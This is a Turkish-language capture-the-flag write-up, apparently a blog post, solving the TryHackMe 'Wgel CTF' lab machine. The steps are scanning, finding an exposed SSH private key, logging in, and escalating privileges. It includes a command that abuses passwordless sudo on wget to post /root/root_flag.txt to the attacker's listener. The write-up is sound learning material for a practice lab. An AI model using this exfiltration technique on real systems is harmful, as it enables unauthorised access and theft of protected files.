# **[İçeriğin orijinalini görmek için linke tıklayın](https://sibermetin.com/zafiyetli-makine-cozumu-tryhackme-wgel-ctf-writeup)**

---

[Wgel CTF](https://tryhackme.com/room/wgelctf) odanın makine çözümü hakkında bir yazı. İyi çalışmalar.

![resim](https://sibermetin.com/uploads/images/202204/image_750x_626a7f34d9cfd.jpg)

Oda çözümüne Nmap taraması ile başlayalım.

![resim](https://sibermetin.com/uploads/images/202204/image_750x_626a5224332f8.jpg)

Yaptığımız tarama sonucunda  22/tcp ssh ve 80/tcp http servislerin açık olduğu görünüyor. Herkese açık olduğu için 80 numaralı bağlantı noktasındaki sunucuya bir göz atalım:

![resim](https://sibermetin.com/uploads/images/202204/image_750x_626a81c6ad20c.jpg)

Standart  Apache sayfasına benziyor. Bir de kaynak kodlarını kontrol edelim :

![resim](https://sibermetin.com/uploads/images/202204/image_750x_626a828a27744.jpg)

"Jessie web sitesini güncellemeyi unutma." şeklinde bir notla karşılaşıyoruz. Jessie daha sonra kullanabileceğimiz bir kullanıcı adı olabilir.

Kaynak kodundan başka bir şey çıkmadığı için bir de dizin taraması yapalım :

![resim](https://sibermetin.com/uploads/images/202204/image_750x_626a82cadf8ec.jpg)

Sitemap adında bir dizin buluyoruz. Bu dizini kontrol ediyoruz ve bir şey çıkmıyor. Tekrar sitemap içinde bir dizin taraması yapalım :

![resim](https://sibermetin.com/uploads/images/202204/image_750x_626a861c7604d.jpg)

Bu dizini kontrıol edelim:

![resim](https://sibermetin.com/uploads/images/202204/image_750x_626a8686c465e.jpg)

Bir ssh id_rsa anahtarı bulduk. id_rsa'yı indirip, gerekli izinleri verelim. İzinleri vermek için aşağıdaki komutu kullanabilirsiniz :

- chmod 600 id_rsa

Şimdi bu id_rsa anahtarı ve Web sitesinde bulmuş olduğum kullanıcı adı ile ssh bağlantısı gerçekleştirmeyi deneyelim:

![resim](https://sibermetin.com/uploads/images/202204/image_750x_626a871e1a263.jpg)

ssh bağlantısını başarılı bir şekilde gerçekleştirdik. Şimdi kullanıcı bayrağını bulalım :

![resim](https://sibermetin.com/uploads/images/202204/image_750x_626a87640984a.jpg)

Genellikle bayraklar .txt dosyalarında olur. Bulmak için find komutunu kullanalım.

- find / -type f -name *.txt 2>/dev/null

![resim](https://sibermetin.com/uploads/images/202204/image_750x_626a87bb87ac9.jpg)

Bayrağımız Documents dizininin altındaymış. Documents dizinine gidip cat komutuyla bayrağımızı okuyalım.

![resim](https://sibermetin.com/uploads/images/202204/image_750x_626a8817479bf.jpg)

user_falag.txt içindeki bayrağı bulmuş olduk.

Root bayrağını bulmamız için yetki yükseltmemiz gerekli. Bunun için sudo -l komutu ile root izini verilen komutlara bakalım.

![resim](https://sibermetin.com/uploads/images/202204/image_750x_626a887d8ea03.jpg)

/usr/bin/wget de şifresiz root olabileceğimizi görüyoruz. Bu açığı kullanabiliriz.

İlk olarak ncat ile kendi bilgisayarımızı dinlemeye alalım.

![resim](https://sibermetin.com/uploads/images/202204/image_750x_626a88d3a9694.jpg)

Karşı makineye şu komutu girelim :

- sudo /usr/bin/wget -post-file=/root/root_flag.txt TryHackMe'nin verdiği ip(vpn):dinlenecek port

![resim](https://sibermetin.com/uploads/images/202204/image_750x_626a89394a3ed.jpg)

wget dizinini kullandığımız için bizden şifre istemedi. Dinleme yaptığımız terminale giderek herhangi bir çıktı vermiş mi bakalım.

![resim](https://sibermetin.com/uploads/images/202204/image_750x_626a899362e51.jpg)

Ve root bayrağı karşımızda!! Böylelikle odayı tamamlamış olduk İyi çalışmalar...
